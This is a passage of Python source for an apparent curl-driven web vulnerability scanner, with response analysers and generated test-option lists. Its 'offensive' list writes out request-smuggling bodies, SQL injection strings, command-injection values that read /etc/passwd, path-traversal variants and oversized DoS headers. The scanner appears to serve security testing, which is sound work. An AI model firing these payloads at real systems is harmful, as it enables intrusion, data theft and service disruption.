                    impact="Proper cookie security implemented",
                    likelihood="N/A",
                    confidence="High",
                    evidence="Set-Cookie header detected with security flags",
                    recommended_action="Maintain current cookie security practices",
                    risk_score=0.0
                ))

        if "../" in stdout or "..\\" in stdout or "etc/passwd" in stdout.lower():
            findings.append(Finding(
                severity=Severity.HIGH,
                cwe_id="CWE-22",
                title="Directory Traversal Detected",
                description="The response suggests directory traversal, indicating potential file system access vulnerability.",
                remediation="Sanitize user input, use allowlists for file access, implement proper path validation.",
                command_name=cmd.name,
                impact="File system access, information disclosure",
                likelihood="Medium",
                confidence="High",
                evidence=f"Directory traversal patterns found: {stdout[:300]}",
                recommended_action="Implement path sanitization, use chroot jails, validate all file paths",
                risk_score=8.0
            ))

        injection_patterns = [
            ("<script", "XSS", Severity.HIGH, "CWE-79"),
            ("javascript:", "JavaScript Injection", Severity.HIGH, "CWE-79"),
            ("onerror=", "Event Handler Injection", Severity.HIGH, "CWE-79"),
            ("onload=", "Event Handler Injection", Severity.HIGH, "CWE-79"),
            ("<iframe", "IFrame Injection", Severity.HIGH, "CWE-79"),
            ("<object", "Object Injection", Severity.HIGH, "CWE-79"),
            ("<embed", "Embed Injection", Severity.HIGH, "CWE-79"),
            ("<applet", "Applet Injection", Severity.HIGH, "CWE-79"),
            ("document.cookie", "Cookie Access", Severity.HIGH, "CWE-79"),
            ("window.location", "Location Manipulation", Severity.HIGH, "CWE-79"),
            ("eval(", "Eval Injection", Severity.HIGH, "CWE-79"),
            ("setTimeout(", "Timeout Injection", Severity.HIGH, "CWE-79"),
            ("setInterval(", "Interval Injection", Severity.HIGH, "CWE-79"),
            ("innerHTML", "HTML Injection", Severity.HIGH, "CWE-79"),
            ("outerHTML", "HTML Injection", Severity.HIGH, "CWE-79"),
            ("document.write", "Document Write Injection", Severity.HIGH, "CWE-79"),
            ("<img", "Image Tag Injection", Severity.MEDIUM, "CWE-79"),
            ("<a href", "Link Injection", Severity.MEDIUM, "CWE-79"),
            ("<div", "Div Injection", Severity.MEDIUM, "CWE-79"),
            ("<span", "Span Injection", Severity.MEDIUM, "CWE-79"),
        ]

        for pattern, title, severity, cwe in injection_patterns:
            if pattern in stdout.lower():
                findings.append(Finding(
                    severity=severity,
                    cwe_id=cwe,
                    title=title,
                    description=f"Potential injection attack vector detected: '{pattern}' in response.",
                    remediation="Sanitize all user input, use proper encoding, implement Content Security Policy.",
                    command_name=cmd.name,
                    impact="Cross-site scripting, code execution, data theft",
                    likelihood="Medium",
                    confidence="Medium",
                    evidence=f"Injection pattern '{pattern}' detected",
                    recommended_action="Implement input validation, use OWASP recommended security headers",
                    risk_score=7.5
                ))
                break

        internal_ip_patterns = [
            ("10.0.", "Internal IP - Class A"),
            ("172.16.", "Internal IP - Class B"),
            ("172.17.", "Internal IP - Class B"),
            ("192.168.", "Internal IP - Class C"),
            ("127.0.0.1", "Localhost IP"),
            ("::1", "IPv6 Localhost"),
            ("fc00:", "IPv6 Unique Local Address"),
            ("fe80:", "IPv6 Link Local Address"),
        ]

        for pattern, title in internal_ip_patterns:
            if pattern in stdout.lower():
                findings.append(Finding(
                    severity=Severity.MEDIUM,
                    cwe_id="CWE-200",
                    title=f"Internal IP Address Exposure - {title}",
                    description=f"Internal IP address pattern '{pattern}' detected in response.",
                    remediation="Remove internal IP addresses from HTTP responses. Use load balancers or CDNs.",
                    command_name=cmd.name,
                    impact="Network mapping, internal infrastructure exposure",
                    likelihood="Medium",
                    confidence="High",
                    evidence=f"Internal IP pattern '{pattern}' detected",
                    recommended_action="Review response content, remove internal network information",
                    risk_score=4.5
                ))
                break

        return findings

    def _analyze_timing(self, duration: float) -> Dict[str, Any]:
        analysis = {}
        if duration > 10:
            analysis["performance_issue"] = True
            analysis["severity"] = "HIGH"
            analysis["description"] = f"Response took {duration:.2f}s, indicating severe performance issues"
        elif duration > 5:
            analysis["performance_issue"] = True
            analysis["severity"] = "MEDIUM"
            analysis["description"] = f"Response took {duration:.2f}s, indicating performance issues"
        elif duration > 2:
            analysis["performance_issue"] = True
            analysis["severity"] = "LOW"
            analysis["description"] = f"Response took {duration:.2f}s, consider optimization"
        else:
            analysis["performance_issue"] = False
            analysis["description"] = f"Response time of {duration:.2f}s is acceptable"
        return analysis

    def _execute_command(self, curl_cmd: CurlCommand, idx: int, total: int) -> ScanResult:
        if not self.running:
            return None
            
        cmd = self._build_curl_command(curl_cmd.cmd)
        start_time = time.time()
        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=self.timeout
            )
            duration = time.time() - start_time
            
            status = "PASS" if proc.returncode == 0 else "FAIL"
            if proc.returncode == -1 or "timeout" in proc.stderr.lower():
                status = "TIMEOUT"
            
            findings = self._analyze_response(proc.stdout, proc.stderr, curl_cmd)
            
            timing_analysis = self._analyze_timing(duration)
            if timing_analysis.get("performance_issue"):
                severity_level = Severity.HIGH if timing_analysis["severity"] == "HIGH" else Severity.MEDIUM if timing_analysis["severity"] == "MEDIUM" else Severity.LOW
                findings.append(Finding(
                    severity=severity_level,
                    cwe_id="CWE-400",
                    title="Performance Issue Detected",
                    description=timing_analysis["description"],
                    remediation="Optimize application performance, implement caching, upgrade infrastructure.",
                    command_name=curl_cmd.name,
                    impact="Service degradation, user experience issues",
                    likelihood="Medium",
                    confidence="High",
                    evidence=f"Response time: {duration:.2f}s",
                    recommended_action="Profile application, implement performance optimizations",
                    risk_score=7.0 if timing_analysis["severity"] == "HIGH" else 5.0 if timing_analysis["severity"] == "MEDIUM" else 3.0
                ))
            
            headers = self._parse_response_headers(proc.stdout)
            ssl_info = self._parse_curl_verbose(proc.stderr)
            
            http_status = 0
            http_match = re.search(r'HTTP/(\d\.\d)\s+(\d{3})', proc.stdout)
            if http_match:
                http_status = int(http_match.group(2))
            
            vulnerability_detected = len(findings) > 0
            risk_level = "NONE"
            max_risk = 0
            for finding in findings:
                if finding.risk_score > max_risk:
                    max_risk = finding.risk_score
                    
            if max_risk >= 8:
                risk_level = "CRITICAL"
            elif max_risk >= 6:
                risk_level = "HIGH"
            elif max_risk >= 4:
                risk_level = "MEDIUM"
            elif max_risk >= 2:
                risk_level = "LOW"
            elif max_risk > 0:
                risk_level = "INFO"
            
            return ScanResult(
                command=curl_cmd,
                exit_code=proc.returncode,
                stdout=proc.stdout,
                stderr=proc.stderr,
                duration=duration,
                status=status,
                findings=findings,
                response_headers=headers,
                ssl_info=ssl_info,
                payload_size=len(proc.stdout) + len(proc.stderr),
                http_status=http_status,
                response_body=proc.stdout,
                vulnerability_detected=vulnerability_detected,
                risk_level=risk_level,
                detailed_analysis=timing_analysis
            )
            
        except subprocess.TimeoutExpired:
            findings = [Finding(
                severity=Severity.HIGH,
                cwe_id="CWE-400",
                title="Command Timeout",
                description=f"Command timed out after {self.timeout}s",
                remediation="Increase timeout or optimize performance",
                command_name=curl_cmd.name,
                impact="Service unavailable",
                likelihood="Medium",
                confidence="High",
                evidence=f"Timeout after {self.timeout}s",
                recommended_action="Review server performance, increase timeout if appropriate",
                risk_score=7.0
            )]
            return ScanResult(
                command=curl_cmd,
                exit_code=-1,
                stdout="",
                stderr="Timeout",
                duration=self.timeout,
                status="TIMEOUT",
                findings=findings,
                vulnerability_detected=True,
                risk_level="HIGH"
            )
        except Exception as e:
            findings = [Finding(
                severity=Severity.CRITICAL,
                cwe_id="CWE-703",
                title="Execution Error",
                description=f"Command execution failed: {str(e)}",
                remediation="Check command syntax and system permissions",
                command_name=curl_cmd.name,
                impact="Assessment failure",
                likelihood="High",
                confidence="High",
                evidence=str(e),
                recommended_action="Verify command syntax, check system permissions",
                risk_score=9.0
            )]
            return ScanResult(
                command=curl_cmd,
                exit_code=-2,
                stdout="",
                stderr=str(e),
                duration=time.time() - start_time,
                status="ERROR",
                findings=findings,
                vulnerability_detected=True,
                risk_level="CRITICAL"
            )

    def run_scan(self, commands: List[CurlCommand]) -> List[ScanResult]:
        results = []
        total = len(commands)
        
        console.print(f"\n[cyan]Starting assessment of {total} commands...[/cyan]\n")
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TaskProgressColumn(),
            console=console
        ) as progress:
            task = progress.add_task("[cyan]Scanning...", total=total)
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.concurrency) as executor:
                futures = {}
                for idx, cmd in enumerate(commands, 1):
                    if not self.running:
                        break
                    future = executor.submit(self._execute_command, cmd, idx, total)
                    futures[future] = cmd
                
                for future in concurrent.futures.as_completed(futures):
                    if not self.running:
                        break
                    result = future.result()
                    if result:
                        results.append(result)
                    
                    with self.lock:
                        self.stats[result.status] += 1
                        for finding in result.findings:
                            self.stats[f"finding_{finding.severity.value.lower()}"] += 1
                    
                    progress.advance(task)
        
        self.results = results
        return results

class CommandGenerator:
    @staticmethod
    def generate_defensive() -> List[CurlCommand]:
        commands = []
        
        defensive_opts = [
            (["--max-time", "1"], "timeout_1", "1 second timeout", "Tests server response within 1 second"),
            (["--max-time", "300"], "timeout_300", "5 minute timeout", "Tests long-running connections"),
            (["--connect-timeout", "1"], "conn_timeout_1", "1s connect timeout", "Tests TCP connection establishment"),
            (["--connect-timeout", "60"], "conn_timeout_60", "60s connect timeout", "Tests TCP with 60s timeout"),
            (["--retry", "0"], "retry_0", "No retries", "Tests behavior without retries"),
            (["--retry", "10"], "retry_10", "10 retries", "Tests retry mechanism"),
            (["--retry-delay", "0"], "retry_delay_0", "No retry delay", "Tests immediate retry behavior"),
            (["--retry-delay", "30"], "retry_delay_30", "30s retry delay", "Tests retry with delay"),
            (["--retry-max-time", "60"], "retry_max_60", "60s max retry", "Tests max retry time"),
            (["--speed-limit", "1000", "--speed-time", "10"], "speed_1k_10s", "1KB/s for 10s", "Tests bandwidth throttling"),
            (["--speed-limit", "1", "--speed-time", "60"], "speed_1b_60s", "1B/s for 60s", "Tests slow connection handling"),
            (["--no-keepalive"], "no_keepalive", "Disable keepalive", "Tests connection without keepalive"),
            (["--keepalive-time", "1"], "keepalive_1s", "1s keepalive", "Tests frequent keepalive"),
            (["--keepalive-time", "300"], "keepalive_300s", "300s keepalive", "Tests long keepalive"),
            (["--max-filesize", "1"], "filesize_1", "1 byte max", "Tests file size limit"),
            (["--max-filesize", "10485760"], "filesize_10mb", "10MB max", "Tests large file handling"),
            (["--limit-rate", "1K"], "rate_1k", "1KB/s limit", "Tests low bandwidth"),
            (["--limit-rate", "100M"], "rate_100m", "100MB/s limit", "Tests high bandwidth"),
            (["--range", "0-1024"], "range_1k", "Range 0-1024", "Tests partial content"),
            (["--range", "0-0"], "range_first", "First byte only", "Tests single byte retrieval"),
            (["--range", "-1"], "range_last", "Last byte only", "Tests last byte retrieval"),
            (["--range", "0-0, -1"], "range_multiple", "Multiple ranges", "Tests multiple range requests"),
            (["--compressed"], "compressed", "Request compressed", "Tests compression support"),
            (["--no-compressed"], "no_compressed", "No compression", "Tests uncompressed handling"),
            (["--no-cache"], "no_cache", "Disable cache", "Tests cache bypass"),
            (["--header", "Cache-Control: no-cache"], "cache_no_cache", "Cache no-cache", "Tests no-cache header"),
            (["--header", "Cache-Control: max-age=0"], "cache_max_age_0", "Cache max-age=0", "Tests immediate expiration"),
            (["--header", "Cache-Control: no-store"], "cache_no_store", "Cache no-store", "Tests no-store caching"),
            (["--header", "Cache-Control: must-revalidate"], "cache_revalidate", "Cache revalidate", "Tests revalidation"),
            (["--header", "Cache-Control: private"], "cache_private", "Cache private", "Tests private caching"),
            (["--header", "Cache-Control: public"], "cache_public", "Cache public", "Tests public caching"),
            (["--header", "Accept: */*"], "accept_all", "Accept all", "Tests wildcard acceptance"),
            (["--header", "Accept: application/json"], "accept_json", "Accept JSON", "Tests JSON negotiation"),
            (["--header", "Accept: text/html,application/xhtml+xml"], "accept_html", "Accept HTML", "Tests HTML negotiation"),
            (["--header", "Accept: application/xml"], "accept_xml", "Accept XML", "Tests XML negotiation"),
            (["--header", "Accept: image/webp,image/apng"], "accept_images", "Accept images", "Tests image negotiation"),
            (["--header", "Accept: application/pdf"], "accept_pdf", "Accept PDF", "Tests PDF negotiation"),
            (["--header", "Accept: application/zip"], "accept_zip", "Accept ZIP", "Tests ZIP negotiation"),
            (["--header", "Accept-Language: en-US,en;q=0.9"], "accept_lang", "Accept Language", "Tests language negotiation"),
            (["--header", "Accept-Language: fr,en;q=0.5"], "accept_lang_fr", "Accept French", "Tests French language"),
            (["--header", "Accept-Language: es,en;q=0.5"], "accept_lang_es", "Accept Spanish", "Tests Spanish language"),
            (["--header", "Accept-Language: de,en;q=0.5"], "accept_lang_de", "Accept German", "Tests German language"),
            (["--header", "Accept-Encoding: gzip, deflate, br"], "accept_encoding", "Accept Encoding", "Tests compression encodings"),
            (["--header", "Accept-Encoding: identity"], "accept_identity", "Accept identity", "Tests identity encoding"),
            (["--header", "Accept-Encoding: *"], "accept_encoding_all", "Accept all encodings", "Tests all encodings"),
            (["--header", "Connection: close"], "conn_close", "Connection close", "Tests non-persistent connection"),
            (["--header", "Connection: keep-alive"], "conn_keepalive", "Connection keepalive", "Tests persistent connection"),
            (["--header", "Connection: upgrade"], "conn_upgrade", "Connection upgrade", "Tests connection upgrade"),
            (["--cacert", "/etc/ssl/certs/ca-certificates.crt"], "cacert", "CA certificate", "Tests CA validation"),
            (["--cert-type", "PEM"], "cert_pem", "PEM certificate", "Tests PEM format"),
            (["--key-type", "PEM"], "key_pem", "PEM key", "Tests PEM key format"),
            (["--tlsv1.2"], "tls_1_2", "TLS 1.2 only", "Tests TLS 1.2 compatibility"),
            (["--tlsv1.3"], "tls_1_3", "TLS 1.3 only", "Tests TLS 1.3 compatibility"),
            (["--no-tlsv1"], "no_tls_1", "No TLS 1.0", "Tests TLS 1.0 exclusion"),
            (["--tls-max", "1.2"], "tls_max_1_2", "TLS max 1.2", "Tests TLS version cap"),
            (["--tls-min", "1.2"], "tls_min_1_2", "TLS min 1.2", "Tests TLS version floor"),
            (["--ciphers", "ECDHE-ECDSA-AES128-GCM-SHA256"], "cipher_strong", "Strong cipher", "Tests strong cipher"),
            (["--ciphers", "ECDHE-RSA-AES128-GCM-SHA256"], "cipher_rsa_strong", "RSA strong cipher", "Tests RSA strong cipher"),
            (["--ciphers", "ECDHE-ECDSA-CHACHA20-POLY1305"], "cipher_chacha", "ChaCha20 cipher", "Tests ChaCha20 cipher"),
            (["--ciphers", "HIGH:!aNULL:!eNULL"], "cipher_high", "High security", "Tests high security ciphers"),
            (["--pinnedpubkey", "sha256//..."], "pinned_pubkey", "Pinned public key", "Tests certificate pinning"),
            (["--random-file", "/dev/urandom"], "random_file", "Random file", "Tests random seed"),
            (["--egd-file", "/dev/random"], "egd_file", "EGD file", "Tests entropy gathering"),
            (["--output", "/dev/null"], "output_null", "Output to null", "Tests silent mode"),
            (["--output", "/tmp/curl_dump_$(date +%s)"], "output_tmp", "Output to temp", "Tests temp output"),
            (["--remote-name"], "remote_name", "Remote name", "Tests filename extraction"),
            (["--remote-header-name"], "remote_header", "Remote header", "Tests Content-Disposition"),
            (["--write-out", "%{http_code}\\n"], "write_http_code", "Write HTTP code", "Tests status code output"),
            (["--write-out", "%{time_total}\\t%{size_download}\\n"], "write_metrics", "Write metrics", "Tests metrics output"),
            (["--write-out", "%{json}"], "write_json", "Write JSON metrics", "Tests JSON output"),
            (["--write-out", "%{url_effective}\\n%{content_type}\\n"], "write_details", "Write details", "Tests detailed output"),
            (["--no-progress-meter"], "no_progress", "No progress meter", "Tests progress suppression"),
            (["--progress-bar"], "progress_bar", "Progress bar", "Tests progress display"),
            (["--verbose"], "verbose", "Verbose output", "Tests verbose logging"),
            (["--trace-ascii", "/tmp/trace.log"], "trace", "Trace output", "Tests ASCII trace"),
            (["--trace-time"], "trace_time", "Trace with time", "Tests timestamped trace"),
            (["--stderr", "/tmp/curl_errors.log"], "stderr_log", "Stderr log", "Tests error logging"),
            (["--noproxy", "*"], "no_proxy_all", "No proxy for all", "Tests proxy bypass"),
            (["--proxy", "http://localhost:3128"], "proxy_local", "Local proxy", "Tests local proxy"),
            (["--proxy", "socks5://localhost:1080"], "proxy_socks", "SOCKS proxy", "Tests SOCKS5 proxy"),
            (["--proxy-user", "user:pass"], "proxy_auth", "Proxy auth", "Tests proxy authentication"),
            (["--no-proxy"], "no_proxy", "No proxy", "Tests direct connection"),
            (["--interface", "eth0"], "interface_eth", "Ethernet interface", "Tests interface binding"),
            (["--interface", "lo"], "interface_loop", "Loopback interface", "Tests loopback binding"),
            (["--ipv4"], "ipv4", "IPv4 only", "Tests IPv4 connectivity"),
            (["--ipv6"], "ipv6", "IPv6 only", "Tests IPv6 connectivity"),
            (["--dns-servers", "8.8.8.8"], "dns_google", "Google DNS", "Tests DNS resolution"),
            (["--dns-servers", "1.1.1.1"], "dns_cloudflare", "Cloudflare DNS", "Tests Cloudflare DNS"),
            (["--dns-servers", "9.9.9.9"], "dns_quad9", "Quad9 DNS", "Tests Quad9 DNS"),
            (["--dns-interface", "eth0"], "dns_interface", "DNS interface", "Tests DNS binding"),
            (["--user", "service_account:password"], "user_basic", "Basic auth", "Tests basic authentication"),
            (["--oauth2-bearer", "token"], "oauth_bearer", "OAuth bearer", "Tests OAuth bearer"),
            (["--basic"], "basic_auth", "Basic authentication", "Tests HTTP basic"),
            (["--digest"], "digest_auth", "Digest auth", "Tests digest authentication"),
            (["--negotiate"], "negotiate_auth", "Negotiate auth", "Tests Kerberos/NTLM"),
            (["--anyauth"], "any_auth", "Any auth", "Tests automatic negotiation"),
            (["--ntlm"], "ntlm_auth", "NTLM auth", "Tests NTLM authentication"),
            (["--aws-sigv4", "aws:amz:region:service"], "aws_sigv4", "AWS Signature V4", "Tests AWS auth"),
            (["--data", ""], "data_empty", "Empty POST", "Tests empty POST"),
            (["--data", "id=1&name=test"], "data_form", "Form data", "Tests form submission"),
            (["--data", "@config.json"], "data_file", "Data from file", "Tests file data"),
            (["--data-raw", "raw_string"], "data_raw", "Raw data", "Tests raw data"),
            (["--data-urlencode", "name=John Doe"], "data_urlencoded", "URL encoded", "Tests URL encoding"),
            (["--json", '{"key":"value"}'], "data_json", "JSON data", "Tests JSON submission"),
            (["--form", "file=@/etc/hosts"], "form_file", "Form with file", "Tests file upload"),
            (["--form", "json={\"key\":\"value\"};type=application/json"], "form_json", "Form with JSON", "Tests JSON in form"),
            (["--form-string", "comment=This is a comment"], "form_string", "Form string", "Tests form string"),
            (["--head"], "head_only", "HEAD request", "Tests HEAD method"),
            (["--request", "GET"], "method_get", "GET method", "Tests GET"),
            (["--request", "POST"], "method_post", "POST method", "Tests POST"),
            (["--request", "PUT"], "method_put", "PUT method", "Tests PUT"),
            (["--request", "DELETE"], "method_delete", "DELETE method", "Tests DELETE"),
            (["--request", "PATCH"], "method_patch", "PATCH method", "Tests PATCH"),
            (["--request", "OPTIONS"], "method_options", "OPTIONS method", "Tests OPTIONS"),
            (["--request", "HEAD"], "method_head", "HEAD method", "Tests HEAD"),
            (["--location"], "follow_redirects", "Follow redirects", "Tests redirect following"),
            (["--location-trusted"], "follow_trusted", "Follow trusted", "Tests trusted redirects"),
            (["--max-redirs", "0"], "max_redirs_0", "No redirects", "Tests redirect blocking"),
            (["--max-redirs", "10"], "max_redirs_10", "10 max redirects", "Tests redirect limit"),
            (["--max-redirs", "50"], "max_redirs_50", "50 max redirects", "Tests high redirect limit"),
            (["--sticky-session"], "sticky_session", "Sticky session", "Tests session persistence"),
            (["--cookie-jar", "/tmp/cookies.txt"], "cookie_jar", "Cookie jar", "Tests cookie storage"),
            (["--cookie", "session=READ_ONLY"], "cookie_session", "Session cookie", "Tests session cookie"),
            (["--cookie", "/dev/null"], "cookie_null", "Null cookie", "Tests null cookie"),
            (["--referer", "https://trusted-site.com"], "referer", "Referer header", "Tests referer"),
            (["--user-agent", "Mozilla/5.0 (compatible; Bot/1.0)"], "user_agent_bot", "Bot UA", "Tests bot detection"),
            (["--header", "User-Agent: curl/${CURL_VERSION}"], "ua_curl", "Curl UA", "Tests curl version UA"),
            (["--header", "X-Forwarded-For: 127.0.0.1"], "xff_local", "XFF local", "Tests IP spoofing"),
            (["--header", "X-Request-ID: $(uuidgen)"], "x_request_id", "X-Request-ID", "Tests request tracing"),
            (["--retry-connrefused"], "retry_connrefused", "Retry on refused", "Tests connection refused retry"),
            (["--retry-all-errors"], "retry_all_errors", "Retry all errors", "Tests all error retry"),
            (["--fail-early"], "fail_early", "Fail early", "Tests early failure"),
            (["--continue-at", "-"], "continue_at", "Continue at offset", "Tests resume download"),
            (["--resolve", "example.com:80:127.0.0.1"], "resolve_local", "Resolve localhost", "Tests DNS override"),
            (["--connect-to", "example.com:80:localhost:8080"], "connect_local", "Connect localhost", "Tests connection routing"),
            (["--dump-header", "/tmp/headers.txt"], "dump_headers", "Dump headers", "Tests header dumping"),
            (["--show-error"], "show_error", "Show errors", "Tests error display"),
            (["--no-silent"], "no_silent", "No silent mode", "Tests verbose progress"),
            (["--libcurl", "/tmp/curl_code.c"], "libcurl", "Generate libcurl", "Tests libcurl generation"),
            (["--header", "X-Forwarded-Host: example.com"], "xff_host", "X-Forwarded-Host", "Tests host forwarding"),
            (["--header", "X-Forwarded-Proto: https"], "xff_proto", "X-Forwarded-Proto", "Tests protocol forwarding"),
            (["--header", "X-Forwarded-Port: 443"], "xff_port", "X-Forwarded-Port", "Tests port forwarding"),
            (["--header", "X-Real-IP: 192.168.1.1"], "x_real_ip", "X-Real-IP", "Tests real IP"),
            (["--header", "X-Original-URL: /hidden"], "x_original_url", "X-Original-URL", "Tests original URL"),
            (["--header", "X-Rewrite-URL: /hidden"], "x_rewrite_url", "X-Rewrite-URL", "Tests rewrite URL"),
            (["--header", "X-HTTP-Method-Override: PUT"], "x_method_override", "X-HTTP-Method-Override", "Tests method override"),
            (["--header", "X-HTTP-Method-Override: DELETE"], "x_method_delete", "X-Method-Override DELETE", "Tests DELETE override"),
            (["--header", "X-HTTP-Method-Override: PATCH"], "x_method_patch", "X-Method-Override PATCH", "Tests PATCH override"),
            (["--header", "X-Proxy-Host: internal.example.com"], "x_proxy_host", "X-Proxy-Host", "Tests proxy host"),
            (["--header", "X-Server-Host: internal.example.com"], "x_server_host", "X-Server-Host", "Tests server host"),
            (["--header", "X-Origin-Host: internal.example.com"], "x_origin_host", "X-Origin-Host", "Tests origin host"),
            (["--header", "X-Source-IP: 192.168.1.1"], "x_source_ip", "X-Source-IP", "Tests source IP"),
            (["--header", "X-Originating-URL: /hidden"], "x_originating_url", "X-Originating-URL", "Tests originating URL"),
        ]
        
        for opts, name, desc, purpose in defensive_opts:
            commands.append(CurlCommand(opts, "defensive", name, desc, purpose))
        
        return commands

    @staticmethod
    def generate_offensive() -> List[CurlCommand]:
        commands = []
        
        offensive_opts = [
            (["--header", "Transfer-Encoding: chunked", "--data", "0\\r\\n\\r\\n"], "te_chunked_0", "Zero chunked", "Tests zero-length chunked encoding"),
            (["--header", "Transfer-Encoding: chunked", "--data", "5\\r\\nHELLO\\r\\n0\\r\\n\\r\\n"], "te_chunked_hello", "Chunked hello", "Tests chunked encoding parsing"),
            (["--header", "Content-Length: 10", "--header", "Transfer-Encoding: chunked", "--data", "0\\r\\n\\r\\nFOOBAR"], "cl_te_smuggle", "CL.TE smuggling", "Tests CL.TE request smuggling"),
            (["--header", "Content-Length: 100", "--data", "GET /admin HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n"], "cl_smuggle", "CL smuggling", "Tests Content-Length smuggling"),
            (["--header", "Transfer-Encoding: chunked", "--header", "Content-Length: 100", "--data", "0\\r\\n\\r\\nFOO"], "te_cl_smuggle", "TE.CL smuggling", "Tests TE.CL request smuggling"),
            (["--header", "Content-Length: -1"], "cl_negative", "Negative CL", "Tests negative content length"),
            (["--header", "Content-Length: 9999999999999999999"], "cl_overflow", "CL overflow", "Tests content length overflow"),
            (["--header", "Transfer-Encoding: xchunked"], "te_xchunked", "X-Chunked", "Tests non-standard chunked"),
            (["--header", "Transfer-Encoding: identity"], "te_identity", "Identity", "Tests identity transfer"),
            (["--header", "Transfer-Encoding: gzip, chunked"], "te_gzip_chunked", "Gzip chunked", "Tests compressed chunked"),
            (["--header", "Content-Encoding: gzip", "--data-binary", "@payload.gz"], "ce_gzip", "Gzip encoding", "Tests gzip attacks"),
            (["--header", "Content-Encoding: deflate", "--data-binary", "@payload.deflate"], "ce_deflate", "Deflate encoding", "Tests deflate attacks"),
            (["--header", "Content-Encoding: br", "--data-binary", "@payload.br"], "ce_br", "Brotli encoding", "Tests Brotli attacks"),
            (["--header", "Content-Encoding: compress"], "ce_compress", "Compress encoding", "Tests compress attacks"),
            (["--header", "Content-Encoding: gzip, deflate, br"], "ce_multiple", "Multiple encodings", "Tests multiple encodings"),
            (["--header", "Accept-Encoding: gzip, deflate, br, zstd, identity, *"], "ae_all", "All encodings", "Tests all encodings"),
            (["--header", "Range: bytes=0-0, -1"], "range_invalid", "Invalid range", "Tests invalid range"),
            (["--header", "Range: bytes=0-18446744073709551615"], "range_overflow", "Range overflow", "Tests range overflow"),
            (["--header", "If-Range: \"evil\""], "if_range_evil", "If-Range evil", "Tests If-Range injection"),
            (["--header", "X-Fuzz: " + "A"*8000], "fuzz_8k", "8k fuzz header", "Tests 8KB fuzzing"),
            (["--header", "X-Fuzz: " + "A"*100000], "fuzz_100k", "100k fuzz header", "Tests 100KB fuzzing"),
            (["--header", "X-Fuzz: " + "A"*1048576], "fuzz_1mb", "1MB fuzz header", "Tests 1MB fuzzing"),
            (["--header", "Cookie: " + "a=b;"*5000], "cookie_5000", "5000 cookies", "Tests 5000 cookies"),
            (["--header", "Cookie: a=" + "A"*4096 + ";"], "cookie_4k", "4k cookie value", "Tests 4KB cookie"),
            (["--header", "Cookie: a=" + "A"*10000], "cookie_10k", "10k cookie value", "Tests 10KB cookie"),
            (["--header", "Cookie: a=" + "A"*100000], "cookie_100k", "100k cookie value", "Tests 100KB cookie"),
            (["--header", "X-Forwarded-For: " + ",".join(["1.1.1.1"]*1000)], "xff_1000", "1000 XFF", "Tests 1000 XFF entries"),
            (["--header", "X-Forwarded-For: 127.0.0.1, 0.0.0.0, 255.255.255.255, ::1, ::ffff:127.0.0.1"], "xff_all", "All XFF", "Tests all IP formats"),
            (["--header", "X-Real-IP: 0.0.0.0"], "x_real_ip", "X-Real-IP", "Tests X-Real-IP injection"),
            (["--header", "X-Originating-IP: 0.0.0.0"], "x_originating_ip", "X-Originating-IP", "Tests X-Originating-IP"),
            (["--header", "X-Remote-IP: 0.0.0.0"], "x_remote_ip", "X-Remote-IP", "Tests X-Remote-IP"),
            (["--header", "X-Client-IP: 0.0.0.0"], "x_client_ip", "X-Client-IP", "Tests X-Client-IP"),
            (["--header", "X-Host: 0.0.0.0"], "x_host", "X-Host", "Tests X-Host injection"),
            (["--header", "X-Forwarded-Host: 0.0.0.0"], "x_forwarded_host", "X-Forwarded-Host", "Tests X-Forwarded-Host"),
            (["--header", "X-Forwarded-Proto: http"], "x_forwarded_proto_http", "X-Forwarded-Proto HTTP", "Tests HTTP spoof"),
            (["--header", "X-Forwarded-Proto: https"], "x_forwarded_proto_https", "X-Forwarded-Proto HTTPS", "Tests HTTPS spoof"),
            (["--header", "User-Agent: ' OR '1'='1"], "ua_sql", "SQL injection UA", "Tests SQL injection"),
            (["--header", "User-Agent: '; DROP TABLE users; --"], "ua_sql_drop", "SQL DROP UA", "Tests SQL DROP injection"),
            (["--header", "User-Agent: $(cat /etc/passwd)"], "ua_cat", "Cat injection", "Tests command injection"),
            (["--header", "User-Agent: ${IFS}cat${IFS}/etc/passwd"], "ua_ifs", "IFS injection", "Tests IFS variable injection"),
            (["--header", "User-Agent: ../../../../etc/passwd"], "ua_path_traversal", "Path traversal UA", "Tests path traversal"),
            (["--header", "User-Agent: ....//....//....//etc/passwd"], "ua_path_double", "Double path traversal", "Tests double dot"),
            (["--header", "User-Agent: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"], "ua_path_encoded", "Encoded path traversal", "Tests URL-encoded traversal"),
            (["--header", "User-Agent: " + "\x00\x01\x02\x03"], "ua_null", "Null bytes UA", "Tests null byte injection"),
            (["--header", "User-Agent: " + "\x90"*1000], "ua_nop", "NOP sled UA", "Tests NOP sled"),
            (["--header", "User-Agent: " + "A"*10000], "ua_10k", "10k UA", "Tests 10KB buffer overflow"),
            (["--header", "User-Agent: " + "A"*100000], "ua_100k", "100k UA", "Tests 100KB memory exhaustion"),
            (["--header", "User-Agent: " + "A"*1048576], "ua_1mb", "1MB UA", "Tests 1MB DoS"),
            (["--request", "TRACE"], "method_trace", "TRACE method", "Tests TRACE vulnerability"),
            (["--request", "TRACK"], "method_track", "TRACK method", "Tests TRACK vulnerability"),
            (["--request", "CONNECT"], "method_connect", "CONNECT method", "Tests CONNECT proxy abuse"),
            (["--request", "PROPFIND"], "method_propfind", "PROPFIND method", "Tests WebDAV enumeration"),
            (["--request", "PROPPATCH"], "method_proppatch", "PROPPATCH method", "Tests WebDAV property attacks"),
            (["--request", "MKCOL"], "method_mkcol", "MKCOL method", "Tests directory creation"),
            (["--request", "MOVE"], "method_move", "MOVE method", "Tests file movement"),
            (["--request", "COPY"], "method_copy", "COPY method", "Tests file copying"),
            (["--request", "LOCK"], "method_lock", "LOCK method", "Tests resource locking"),
            (["--request", "UNLOCK"], "method_unlock", "UNLOCK method", "Tests resource unlocking"),
            (["--request", "SEARCH"], "method_search", "SEARCH method", "Tests WebDAV search"),
            (["--request", "PURGE"], "method_purge", "PURGE method", "Tests cache poisoning"),
            (["--request", "ACL"], "method_acl", "ACL method", "Tests WebDAV ACL attacks"),
            (["--request", "BASELINE-CONTROL"], "method_baseline", "BASELINE-CONTROL", "Tests baseline control"),
